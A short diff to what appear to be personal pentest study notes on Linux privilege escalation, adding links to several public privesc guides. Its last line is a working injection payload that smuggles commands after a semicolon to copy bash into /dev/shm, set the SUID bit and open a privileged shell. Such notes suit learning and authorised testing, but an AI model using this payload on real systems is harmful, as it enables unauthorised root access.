@@ -8,6 +8,14 @@
 #
 https://johnjhacking.com/blog/linux-privilege-escalation-quick-and-dirty/
 #
+https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#summary
+#
+https://johnermac.github.io/notes/pnpt/linuxprivesc
+#
+https://medium.com/@wiktorderda/linux-privesc-93c16c1e645a
+#
+
+#
 ##
 
 yoyo ; cp $(which bash) /dev/shm; chmod +s /dev/shm/bash; /dev/shm/bash -p
